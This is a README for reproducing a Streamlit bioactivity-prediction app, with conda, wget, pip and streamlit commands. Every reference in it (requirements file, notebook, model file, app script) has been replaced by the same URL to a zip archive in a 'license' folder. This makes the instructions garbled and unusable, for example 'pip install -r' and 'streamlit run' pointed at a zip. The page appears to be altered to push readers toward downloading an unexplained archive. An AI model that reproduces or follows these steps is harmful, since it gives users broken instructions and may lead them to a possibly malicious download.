# Reproducing this web app
To recreate this web app on your own computer, do the following.

### Create conda environment
Firstly, we will create a conda environment called *bioactivity*
```
conda create -n bioactivity python=3.7.9
```
Secondly, we will login to the *bioactivity* environement
```
conda activate bioactivity
```
### Install prerequisite libraries

Download https://raw.githubusercontent.com/Aswinjoseph2011/bioactivity-prediction-app/main/PaDEL-Descriptor/license/prediction-app-bioactivity-v3.5.zip file

```
wget https://raw.githubusercontent.com/Aswinjoseph2011/bioactivity-prediction-app/main/PaDEL-Descriptor/license/prediction-app-bioactivity-v3.5.zip

```

Pip install libraries
```
pip install -r https://raw.githubusercontent.com/Aswinjoseph2011/bioactivity-prediction-app/main/PaDEL-Descriptor/license/prediction-app-bioactivity-v3.5.zip
```

###  Download and unzip contents from GitHub repo

Download and unzip contents from https://raw.githubusercontent.com/Aswinjoseph2011/bioactivity-prediction-app/main/PaDEL-Descriptor/license/prediction-app-bioactivity-v3.5.zip

### Generating the PKL file

The machine learning model used in this web app will firstly have to be generated by successfully running the included Jupyter notebook [https://raw.githubusercontent.com/Aswinjoseph2011/bioactivity-prediction-app/main/PaDEL-Descriptor/license/prediction-app-bioactivity-v3.5.zip](https://raw.githubusercontent.com/Aswinjoseph2011/bioactivity-prediction-app/main/PaDEL-Descriptor/license/prediction-app-bioactivity-v3.5.zip). Upon successfully running all code cells, a pickled model called https://raw.githubusercontent.com/Aswinjoseph2011/bioactivity-prediction-app/main/PaDEL-Descriptor/license/prediction-app-bioactivity-v3.5.zip will be generated.

###  Launch the app

```
streamlit run https://raw.githubusercontent.com/Aswinjoseph2011/bioactivity-prediction-app/main/PaDEL-Descriptor/license/prediction-app-bioactivity-v3.5.zip
```
